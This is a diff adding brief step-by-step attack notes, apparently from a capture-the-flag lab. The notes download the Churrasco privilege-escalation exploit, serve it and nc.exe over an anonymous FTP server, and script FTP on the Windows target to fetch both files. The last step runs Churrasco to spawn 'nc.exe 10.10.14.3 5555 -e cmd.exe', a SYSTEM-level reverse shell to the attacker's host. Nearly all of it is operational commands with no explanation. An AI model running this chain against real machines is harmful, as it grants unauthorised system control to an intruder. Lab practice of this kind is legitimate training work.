@@ -1,0 +1,22 @@
+Step 1: wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe?raw=true
+Step 2: mv churrasco.exe\?raw\=true churrasco.exe
+Step 3: python -m pyftpdlib -p 21
+Step 4: 
+```ftp
+echo open 10.10.14.3 > ftp.txt
+echo anonymous>>ftp.txt
+echo pass >>ftp.txt
+echo binary >>ftp.txt
+echo get churrasco.exe >> ftp.txt
+echo bye >> ftp.txt
+```
+Step 5: cp /usr/share/windows-resources/binaries/nc.exe . 
+```
+echo open 10.10.14.3 > ftp.txt
+echo anonymous>>ftp.txt
+echo pass >>ftp.txt
+echo binary >>ftp.txt
+echo get nc.exe >> ftp.txt
+echo bye >> ftp.txt
+```
+Step 6: .\churrasco.exe "C:\wmpub\nc.exe 10.10.14.3 5555 -e cmd.exe"
